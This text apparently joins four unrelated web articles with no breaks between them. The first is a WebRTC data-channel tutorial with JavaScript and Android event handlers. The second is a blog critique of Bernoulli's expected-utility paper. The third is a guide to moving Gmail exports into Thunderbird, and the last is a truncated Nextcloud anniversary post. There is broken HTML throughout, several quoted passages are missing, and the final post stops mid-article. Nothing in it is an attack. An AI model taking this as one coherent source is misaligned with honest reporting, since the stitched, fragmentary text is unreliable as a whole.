<p>As mentioned in <a href="https://antmedia.io/webrtc-chat-and-file-transfer/">our blog related to chat application</a>, we recommend sending events or user actions as structured data in JSON or XML. For most of the applications parsing them with common JSON or XML parsers in the receiver side would be enough but for complex applications having a validation schema like XML Schema or JSON Schema for these events can be useful and less error prone when validating, parsing, mapping them.</p>
<p>An example event in JSON format which are sent through data channel to all conference participants in our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><em>conference.html</em> </a>&nbsp;page when someone mutes his microphone looks like this:</p>
<pre><span>{
"streamId": "stream1",
"eventType": "MIC_MUTED"
}</span></pre>
<p>For more complex applications some kind of communication protocol is needed to manage the possible interactions between different users or the system. When designing such protocols for interactive and reactive applications, it is very important to clearly specify and examine what actions and events a user with a certain role can generate and which other states these events can lead to. In such cases, UML Sequence diagrams can be helpful to document and design the communication scenarios and UML State diagrams can help to handle all edge and use cases which are dependent on different states and roles. Next we will talk about a simple use case related conferences.</p>
<h3>Use Case: WebRTC Video Conference Events</h3>
<p>In latest version of our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><span><em>conference.html</em> </span></a>and <span><em>ConferenceActivity</em></span> in our WebRTC Android SDK, when a conference attendee mutes or unmutes his microphone or enables or disables his video stream for publishing, <a href="#Message_Format_and_Protocol">a special event message like in section above</a> is sent to the all the other conference participants, through WebRTC Data Channel. Then all other stream participants parse the received event and based on the event type the developer can customize the <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank">conference.html</a> to notify the users or show an icon on the corresponding streams.</p>
<p>In Web side when the event receives the <span>“data_received”</span> signal in callback function is called:</p>
<pre><span>... else if(info == "data_received") { handleNotificationEvent(obj); }</span></pre>
<p>which then handles different notification events based on the event type:</p>
<pre><span>function handleNotificationEvent(obj) {</span>
<span>&nbsp; &nbsp; console.log("Received data : ", obj.event.data);</span>
<span>&nbsp; &nbsp; var notificationEvent = JSON.parse(obj.event.data);</span>
<span>&nbsp; &nbsp; if(notificationEvent != null &amp;&amp; typeof(notificationEvent) == "object") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; var eventStreamId = notificationEvent.streamId;</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; var eventTyp = notificationEvent.eventType;</span>

<span>&nbsp; &nbsp; &nbsp; &nbsp; if(eventTyp == "CAM_TURNED_OFF") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Camera turned off for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; } else if (eventTyp == "CAM_TURNED_ON") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Camera turned on for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;} else if (eventTyp == "MIC_MUTED") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Microphone muted for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;} </span><span>else if (eventTyp == "MIC_UNMUTED") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Microphone unmuted for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;}</span>
<span>&nbsp; &nbsp;}</span>
<span>}</span></pre>
<p>In this case for simplicity, it only logs them to the console. In Android in the <em><span>ConferenceActivity</span> <span>onMessage</span></em> method the notification events are handled analogously with Toast messages:</p>
<pre><span>public void onMessage(DataChannel.Buffer buffer, String dataChannelLabel) {</span>
<span>&nbsp; &nbsp; ByteBuffer data = buffer.data;</span>
<span>&nbsp; &nbsp; String strDataJson = new String(data.array(), StandardCharsets.UTF_8);</span>

<span>&nbsp; &nbsp; try {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;JSONObject json = new JSONObject(strDataJson);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;String eventType = json.getString("eventType");</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;String streamId = json.getString("streamId");</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;Toast.makeText(this, eventType + " : " + streamId, Toast.LENGTH_LONG).show();</span>
<span>&nbsp; &nbsp; } catch (Exception e) {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;Log.e(getClass().getSimpleName(), e.getMessage());</span>
<span>&nbsp; &nbsp; }</span>
<span>}</span></pre>

<h3>Use Case: Raising Hand in E-Learning</h3>
<p>A more complex case would be a student raising hand to ask a question in an E-learning application.</p>
<p>In our <span>hypothetical </span>scenario, multiple students can send raise hand messages approximately in the same time through WebRTC Data Channel and after that the teacher should decide to accept one of their requests or reject their requests. So the answer of the teacher should reference the unique stream id of the sender of the <span>RaiseHandRequest</span> which he accepted or rejected. If he accepts a request he will send accept message to everybody and the student whose request is accepted will automatically start publishing his video stream and the others will play it.</p>

We can add also following constraint to our scenario; while a student is asking a question, no other student can request to ask any questions. To implement this constraint the state information can be stored in each participants with following possible states:</p>
<ol>
<li>Teaching</li>
<li>Question_Session_Empty</li>
<li>Question_Session_Full</li>
</ol>
<p>So the students can only ask questions when state is <span>Question_Session_Empty</span> and when state is <span>Question_Session_Full,</span>&nbsp;nobody can raise hand to ask questions. In our scenario the coordinator of the state will be the teacher and in edge case where a student is temporarily disconnected and reconnects, the current state should be sent to him by the teacher. (Another option is teacher sending the state regularly as some kind of keep alive message.)</p>
<p>In this scenario an example <span>RaiseHandRequest</span> request in JSON format would look like this:</p>
<pre><span>{</span>
<span>"senderId":"student1",</span>
<span>"eventType":"RaiseHandRequest",</span>
<span>"eventTime": 1592602900,</span>
<span>"description":"Question Related to Lesson 1"</span>
<span>}</span></pre>
<p>And a positive answer to his request from the teacher would look like this:</p>
<pre><span>{</span>
<span>"senderId":"teacher1",</span>
<span>"eventType":"RaiseHandAccept",</span>
<span>"eventTime": 1592602986,</span>
<span>"answerToRequest": "student1",</span>
<span>"description":"You have only 1 minute to ask"</span>
<span>}
</span></pre>
<p>After receiving this, the <span>student1</span> would start publishing his video stream and the others would start playing it.</p>

		<p>Not all academic fields have a clear starting point, a seminal paper that constitutes the foundation of the entire discipline. But economics does. The paper that defines modern formal economics was written by Daniel Bernoulli in 1738. It introduces expected utility theory. The main thrust of our work is, of course, to replace expected utility theory and instead work with time-average growth rates of wealth. I’ll mention how that works, but the focus of this post will be on something else. Bernoulli’s paper is not only conceptually misleading but also technically flawed in a sneaky way that keeps confusing everyone. Where Bernoulli determines the price to be paid for a risky prospect, he contradicts himself. I wouldn’t make such a fuss about this if the paper wasn’t so absolutely crucial. This basis of economics contains an error that invalidates commonly held beliefs and puts tens of thousands of studies into a different light. I recently <a href="https://twitter.com/ole_b_peters/status/963084568831119361">encouraged people, using twitter,</a> to read the paper and see for themselves. In this blog post I go through the relevant analysis step by step and address questions that came up in response to the tweet.</p>

<h2>Preliminaries</h2>
<p>Bernoulli’s paper was re-published in 1954 in <a href="https://www.econometricsociety.org/publications/econometrica/1954/01/01/exposition-new-theory-measurement-risk">Econometrica</a> (if you don’t like paywalls, here’s a <a href="http://bit.ly/2nShXn5">free pdf</a>). This is the standard translation from Latin, and page numbers below refer to it. I have not read the original Latin paper, but the error is spelled out in words, visually in a figure, and also in an equation, so this is not something lost in translation. If you have a copy of the original, please send it to me. <em>[2018-02-18 addendum: a scan of the original is <a href="https://archive.org/details/SpecimenTheoriaeNovaeDeMensuraSortis" target="_blank" rel="noopener">here</a>.]</em> The paper is so fundamental to economics that more than 200 years after its publication it was fished out of the proceedings of the Papers of the Imperial Academy of Sciences in Petersburg (Vol. V, 1738, pp. 175-192), translated into English, and published in the leading journal of the field.</p>
<h2>What is expected utility theory?</h2>
<p>Expected utility theory (EUT) is a form of decision theory. Imagine someone offers you a lottery ticket. Prior to Bernoulli, it was assumed that people roughly maximize the expected change in wealth resulting from such a gamble. That is, if initial wealth is <img src="https://s0.wp.com/latex.php?latex=x%28t%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x(t)" title="x(t)"> and possible changes in wealth are <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> then you’d maximize</p>
<p>(Eq.1)&nbsp;&nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+x%28t%2B%5Cdelta+t%29+-+x%28t%29+%5Crangle+%3D+%5Clangle+%5Cdelta+x%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle x(t+\delta t) - x(t) \rangle = \langle \delta x\rangle" title="\langle x(t+\delta t) - x(t) \rangle = \langle \delta x\rangle">.</p>
<p>Here, <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Ccdot+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \cdot \rangle" title="\langle \cdot \rangle"> is the expectation operator. Some people like to denote it by <img src="https://s0.wp.com/latex.php?latex=%5Cmathbb%7BE%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\mathbb{E}" title="\mathbb{E}"> but it’s same thing. If <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+x%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta x\rangle" title="\langle \delta x\rangle"> is positive, you’d buy the ticket, if it’s negative, you wouldn’t. But observations soon convinced everyone that this is not how people behave.</p>
<p>EUT was introduced as a refinement of this decision criterion. It says that you will choose the action that maximizes the expected change, not of your wealth but of your utility. The insight here is that people don’t evaluate gambles in isolation but with respect to a reference level (their initial wealth). An extra dollar is worth less to me if I’m rich than if I’m poor. Mathematically, a so-called utility function <img src="https://s0.wp.com/latex.php?latex=u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)" title="u(x)"> is introduced, where <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x"> represents wealth.</p>
<p>The most commonly used utility function is <img src="https://s0.wp.com/latex.php?latex=u%28x%29%3D%5Clog+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)=\log x" title="u(x)=\log x">. This is motivated by assuming that the extra utility someone attaches to an extra dollar is inversely proportional to the wealth that that someone already has, p.25:</p>

<p>Later on Bernoulli writes this assumption as the differential equation <img src="https://s0.wp.com/latex.php?latex=du+%3D+1%2Fx+dx&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="du = 1/x dx" title="du = 1/x dx">, whose solution is the logarithm. Let’s write down what EUT wants us to maximize:</p>
<p>(Eq.2) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Clangle+%5Cln%5Bx%28t%2B%5Cdelta+t%29%5D-%5Cln%5Bx%28t%29%5D+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u \rangle = \langle \ln[x(t+\delta t)]-\ln[x(t)] \rangle" title="\langle \delta u \rangle = \langle \ln[x(t+\delta t)]-\ln[x(t)] \rangle">.</p>
<h3>What’s our conceptual critique?</h3>
<p>By re-writing this object you will immediately see that it actually means something else, and that’s the essence of our conceptual critique. Logarithms turn division into subtraction, <img src="https://s0.wp.com/latex.php?latex=%5Cln%28a%2Fb%29%3D%5Cln+a+-%5Cln+b&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\ln(a/b)=\ln a -\ln b" title="\ln(a/b)=\ln a -\ln b">. So (Eq.2) can be re-written as</p>
<p>(Eq.3) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Cleft%5Clangle%5Cln%5Cleft%28%5Cfrac%7Bx%28t%2B%5Cdelta+t%29%7D%7Bx%28t%29%7D%5Cright%29+%5Cright%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u \rangle = \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle" title="\langle \delta u \rangle = \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle">.</p>
<p>Now divide both sides by <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+t&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta t" title="\delta t"></p>
<p>(Eq.4) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Cfrac%7B1%7D%7B%5Cdelta+t%7D%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Cfrac%7B1%7D%7B%5Cdelta+t%7D+%5Cleft%5Clangle%5Cln%5Cleft%28%5Cfrac%7Bx%28t%2B%5Cdelta+t%29%7D%7Bx%28t%29%7D%5Cright%29+%5Cright%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\frac{1}{\delta t}\langle \delta u \rangle = \frac{1}{\delta t} \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle" title="\frac{1}{\delta t}\langle \delta u \rangle = \frac{1}{\delta t} \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle">.</p>
<p>What’s this? In any field other than economics, this object is called the expected exponential growth rate of wealth. No utility required, no psychology required. Digging just a little bit deeper, the whole story comes to light. Wealth dynamics are fundamentally multiplicative — we can invest wealth to generate more wealth. For such dynamics the exponential growth rate is an ergodic observable, which means its expectation value tells us what happens in the long run. Mystery solved! People just optimize what happens to their wealth over time. Crucially, additive wealth changes, <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> are not ergodic, wherefore the expectation value in (Eq.1) does NOT tell us what happens over time.</p>
<p>Economics textbooks and papers miss this point. The problem is treated in an a-temporal space, as a so-called “one-shot game”. The mathematics is the mathematics of things happening in parallel universes, not of things happening over time. Where time is mentioned, it is usually wrongly assumed that <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+x+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta x \rangle" title="\langle \delta x \rangle"> indicates what happens over time. Endless arguments ensue over whether <img src="https://s0.wp.com/latex.php?latex=%5Cln+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\ln x" title="\ln x"> is the correct psychological re-weighting people apply to wealth — in reality this is a question about dynamics, with psychology as a second-order effect — of course we can be deceived, confused, or stupid and not act in our best interest. It’s also far from easy to put a number on wealth <img src="https://s0.wp.com/latex.php?latex=x%28t%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x(t)" title="x(t)">, or indeed on the different <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> and their probabilities involved in real-world decisions.</p>
<p>The history of economics is a wonderful example of how a basic conceptual error prevents the detection of technical errors and inconsistencies. Without the right concepts it’s just not possible to ask the right questions, let alone find consistent answers.</p>
<h3>How much would I pay for a lottery ticket?</h3>
<p>Let’s put our conceptual troubles aside for a moment and use EUT to address precisely one of the questions Bernoulli asked. My initial wealth is <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">, I have to pay a ticket fee <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F">, and I can win prizes <img src="https://s0.wp.com/latex.php?latex=G%28n%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(n)" title="G(n)"> with probabilities <img src="https://s0.wp.com/latex.php?latex=p%28n%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="p(n)" title="p(n)">, where <img src="https://s0.wp.com/latex.php?latex=1%5Cleq+n+%5Cleq+N&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="1\leq n \leq N" title="1\leq n \leq N"> is a random integer denoting which of the <img src="https://s0.wp.com/latex.php?latex=N&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="N" title="N"> possible prizes I win. We imagine the lottery to take a time <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+t&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta t" title="\delta t"> that doesn’t depend on which prize is won.</p>
<p>EUT says: find the value <img src="https://s0.wp.com/latex.php?latex=F_%7B%5Ctext%7Bmax%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F_{\text{max}}" title="F_{\text{max}}"> that makes the expected change in utility zero. If I pay more, the lottery will have a negative expected utility change, and EUT would advise me not to take part. Mathematically, here is the object we have to compute:</p>
<p>(Eq.5) &nbsp;&nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle%5Cdelta+u+%5Crangle%3D+%5Csum_n+p%28n%29+u%28x%2BG%28n%29-F%29+-+u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle\delta u \rangle= \sum_n p(n) u(x+G(n)-F) - u(x)" title="\langle\delta u \rangle= \sum_n p(n) u(x+G(n)-F) - u(x)"></p>
<p>That’s it. Now vary <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F"> so that the expected change in utility becomes zero. The value of <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F"> where that happens is the maximum fee I should pay for the lottery.</p>
<h2>Bernoulli’s error</h2>
<p>Bernoulli makes an error when he talks about this fee. The key figure is on p.26, and I’ve scribbled in red a translation of Bernoulli’s notation into the symbols used in <a href="https://doi.org/10.1063/1.4940236" target="_blank" rel="noopener">Peters and Gell-Mann (2016)</a>.</p>

<p>Let me talk you through the figure. The horizontal axis represents wealth <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">, and the vertical axis represents utility, so that the solid curve is the utility function <img src="https://s0.wp.com/latex.php?latex=u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)" title="u(x)">.</p>
<p>Let’s focus on the solid horizontal line first. The point B is the initial wealth <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">. The point p, to the left of B, represents the wealth <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">, that is, the initial wealth minus the ticket fee. The points C, D, E, F are wealth levels arrived at by adding to the initial wealth one of the possible prizes <img src="https://s0.wp.com/latex.php?latex=G%281%29%2C+G%282%29%2C+G%283%29%2C+G%284%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(1), G(2), G(3), G(4)" title="G(1), G(2), G(3), G(4)">.</p>
<p>You may already suspect the problem: let’s imagine outcome 1 occurs in the lottery, meaning we receive the prize <img src="https://s0.wp.com/latex.php?latex=G%281%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(1)" title="G(1)">. In that case, our wealth will change to <img src="https://s0.wp.com/latex.php?latex=x%2BG%281%29-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x+G(1)-F" title="x+G(1)-F">, and not <img src="https://s0.wp.com/latex.php?latex=x%2BG%281%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x+G(1)" title="x+G(1)"> (which is the position of point C). We have to subtract the fee! The points C, D, E, F marked by Bernoulli have no relevance to the problem (unless the fee is zero).</p>
<p>Now let’s walk along the utility curve. The point o marks the utility of&nbsp; wealth <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">, so that the dashed line po is the drop in utility associated with a drop in wealth from <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x"> to <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">. The points G, H, L, M (to the right of B along the utility curve) represent the utilities associated with the irrelevant wealth levels <img src="https://s0.wp.com/latex.php?latex=u%28x%2BG%281%29%29%2C+u%28x%2BG%282%29%29%2C+u%28x%2BG%283%29%29%2C+u%28x%2BG%284%29%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x+G(1)), u(x+G(2)), u(x+G(3)), u(x+G(4))" title="u(x+G(1)), u(x+G(2)), u(x+G(3)), u(x+G(4))">. The point O represents the expected utility assuming prizes are received with their respective probabilities <span><em>but no fee is paid</em></span>, p.26</p>

<p>In <a href="https://doi.org/10.1063/1.4940236">Peters and Gell-Mann (2016)</a> we call this object <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B+%5Crangle+%3A%3D+%5Csum_n+p%28n%29+u%28x%2BG%28n%29%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+ \rangle := \sum_n p(n) u(x+G(n))" title="\langle \delta u^+ \rangle := \sum_n p(n) u(x+G(n))">, for want of a better symbol.</p>
<p>Now comes Bernoulli’s error. He claims that the lottery is to be valued by comparing <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+ \rangle" title="\langle \delta u^+ \rangle"> to the loss in utility one would suffer if one were to buy the lottery ticket for its fee but not receive any prize. The key passage is on p.26–27</p>

<p>This amounts to a decision criterion, different from (Eq.5) and inconsistent with EUT. We denote with the symbol <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+u%5E-&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta u^-" title="\delta u^-"> what Bernoulli calls “the disutility to be suffered by losing” (Bp in his notation). Now we can write Bernoulli’s decision criterion in symbols. Bernoulli tells us to buy a ticket if the following quantity is positive, and not to buy it if it’s negative</p>
<p>(Eq.6) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B%5Crangle+-+%5Cdelta+u%5E-+%3D+%5Cunderbrace%7B%5Clangle+u%28x%2BG%29+%5Crangle+-+u%28x%29%7D_%7B+%5Clangle+%5Cdelta+u%5E%2B%5Crangle%7D+-+%5Cunderbrace%7B%5Bu%28x%29+-+u%28x-F%29%5D%7D_%7B%5Cdelta+u%5E-%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+\rangle - \delta u^- = \underbrace{\langle u(x+G) \rangle - u(x)}_{ \langle \delta u^+\rangle} - \underbrace{[u(x) - u(x-F)]}_{\delta u^-}" title="\langle \delta u^+\rangle - \delta u^- = \underbrace{\langle u(x+G) \rangle - u(x)}_{ \langle \delta u^+\rangle} - \underbrace{[u(x) - u(x-F)]}_{\delta u^-}">.</p>
<h2>Error or different model?</h2>
<p>In principle, one could now say that Bernoulli just had a different model of people’s behavior than does modern economics. That would be bad enough because modern economics claims that it has the same model as Bernoulli. It’s more likely that Bernoulli got confused specifically when he tried to find the maximum fee. Otherwise he seems consistent with EUT, for instance on p.24, where he describes the certain profit (“the value of the risk in question”) that corresponds to an uncertain profit</p>

<p>Let’s really kill this. Why is (Eq.6) not a good decision criterion?</p>
<ol>
<li>It is easy to construct an example where the maximum fee I should pay, <img src="https://s0.wp.com/latex.php?latex=F_%7B%5Ctext%7Bmax%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F_{\text{max}}" title="F_{\text{max}}">, is smaller than the smallest possible prize in the lottery, but the criterion still tells me to refrain from buying a ticket. That makes no sense: such a lottery has no downside risk. I’m guaranteed a positive net profit, the only uncertain element is how much better off I will be after the game. Intriguingly — have another look at the figure — the maximum fee calculated by Bernoulli <em>is </em>smaller than the smallest possible prize, assuming that one of the prizes will be won (the distance between B and p is smaller than the distance between B and C).</li>
<li>Another problem is this: how much should I be willing to pay for one dollar, according to Bernoulli? What? … for one dollar? One dollar, of course! Yes, but not according to Bernoulli. Try it out: <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B%5Crangle+%3C+%5Cdelta+u%5E-&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+\rangle < \delta u^-" title="\langle \delta u^+\rangle < \delta u^-"> for any non-zero number of dollars I buy in dollars, due to the concavity of the utility function. …</li></ol></div></article></div>

							<div><p>How to download all your emails from Gmail and read them somewhere else. And maybe a bit of why to do so…</p>
<p>Google reads your emails and sells your stuff to other companies – maybe. Who really knows? You can agree to their privacy policy, but do you really know in how many ways you as a Google user can be monetized? Maybe this sounds like a conspiracy theory. The bottom line is that I don’t want to be that +1 to Google so Google can sell my data or do whatever it does all under pretense that it will be better ‘experience’ for me at the end. There are many other reasons people decide do leave Google.</p>
<p>Read some of the stories :</p>

</ul>
<p>Whether you despise Google and want out or are interested in playing with .mbox files here is how to do it.</p>
<h3>Goodbye Gmail</h3>
<p>When you decide to leave Gmail, you will want to do something with all you messages. Let say you want to download them and use them offline. Google makes it easy for you to download your data using <a href="https://takeout.google.com/">Google Takeout.</a> Fololow the link and since you want only email messages, click on <em>Deselect all</em> and check Mail like on the picture below.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1.png" alt="" width="1189" height="273" srcset="https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1.png 1189w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-300x69.png 300w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-1024x235.png 1024w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-768x176.png 768w" sizes="(max-width: 1189px) 100vw, 1189px"></p>
<p>Scroll to the bottom and go through next couple of steps. At the end, you will get a message saying something like Google is working on it and you will get another message some time later with a download link for your data. I find their download page a bit confusing, but maybe that is just me. Download what is offered. Look for the .mbox file afterwards. If you used Gmail for several years it will be couple of GB big.</p>
<p>Next thing to do is find a way to read the emails from this .mbox file. I asked around a bit, goducked as well {guys on <a href="https://fosstodon.org/">fosstodon</a> [<a href="https://joinmastodon.org/">masstodon</a> (like twitter but better) instance for foss geeks and other peculiar characters] were helpful} and decided to use Thunderbird portable to read my .mbox file with emails.</p>
<h3>Hello Thunderbird</h3>
<p>The idea is simple: install a mail client that can read .mbox file and then import/open the file into/with the client. Thunderbird portable* can do just so. You can download it <a href="https://portableapps.com/apps/internet/thunderbird_portable">here</a>. If you want to use regular Thunderbird, you can. I have chosen portable version because I wanted to put everything (client and emails) on my USB drive and run it from there. The setup is pretty much the same for portable and regular app. After you installed Thunderbird, cheat your way through the new account setup in order get past setup dialogs and for local folders to appear in the main screen (look at the picture below) or follow the procedure as described <a href="https://commons.lbl.gov/display/~jwelcher@lbl.gov/Reading+an+mbox+file+with+Thunderbird">here</a>.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/local-folders-150x98.png" alt="" width="194" height="98"></p>
<p>Depending on how you cheated so far, there should be some kind of account created and some other folders. Go to <em>Options –&gt; Account settings</em> and delete all accounts. You should be left with local folders only. Check the <em>Outgoing server</em> if you like just in case some unwanted settings ended up there.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/delete-account.png" alt="" width="600" height="349" srcset="https://effilicious.com/wp-content/uploads/2020/07/delete-account.png 600w, https://effilicious.com/wp-content/uploads/2020/07/delete-account-300x175.png 300w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>Next thing to do is importing .mbox file into Thunderbird. You can do it by moving your .mbox file to your Thunderbird local directory. Look at the picture above. There is the path to the directory. Put the .mbox file there,restart Thunderbird and give it some time to deal with the .mbox file. After it finishes there should be a new folder in Local Folders with all your emails in it. Rename it to something wild like My exGmail…</p>
<hr>
<p>*there are probably many other email clients that can deal with mailbox file</p></div>

July 3, 2020 | https://kyrofa.com/posts/four-years-of-nextcloud | <a href="https://web.archive.org/web/*/https://kyrofa.com/posts/four-years-of-nextcloud">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="mediumInsert-94"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/96/nextcloud-19-login.jpg" alt=""></figure></div><p>I'm a few weeks late on celebrating Nextcloud's four year anniversary, but I'm doing it anyway! My how time flies. I became a part of the ownCloud community back in 2012. Heck, you can still find blog posts about how I ran it on this very blog if you scroll down far enough. Then, in 2015, I saw the post about the <a href="https://owncloud.org/news/western-digital-and-owncloud-team-up-to-bring-owncloud-to-home-users/">Western Digital/ownCloud</a> collaboration on what would eventually become the Nextcloud Box. But I'm getting ahead of myself.<br></p><p>The timing was excellent. We at Canonical were busy developing <a href="https://snapcraft.io/">Ubuntu Core and snaps</a>, and I had just recently joined the team responsible for developing snapcraft, the tool that creates snaps. I thought "What better way to learn the ins and outs of what I'm making than to participate in this competition!" So a few ownCloud community members and I worked on <a href="https://www.mail-archive.com/devel@owncloud.org/msg02257.html">exactly that</a>. It was ultimately selected as the platform to ship on the Box, <a href="https://karlitschek.de/2016/04/big-changes-i-am-leaving-owncloud-inc-today/">just in time to lose</a> every <a href="https://blog.jospoortvliet.com/2016/05/moving-on-from-owncloud.html">contact I had at ownCloud</a>.</p><p>I was disappointed. I assumed the project was dead. Then I heard from my friends, and was told about Nextcloud. And they retained the Western Digital contacts, who now wanted to continue the project with them!</p><p>I was excited. Within days of Nextcloud making their first release I had created a Nextcloud snap. You can still use Nextcloud v9 today, in fact:</p><pre>$ sudo snap install nextcloud --channel=9</pre><p>I'll always have fond memories of those pixelated clouds.</p><div id="mediumInsert-5"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/89/nextcloud-9.jpg" alt=""></figure></div><p>I was very happy with it. A one-line installation method for a production-ready Nextcloud. 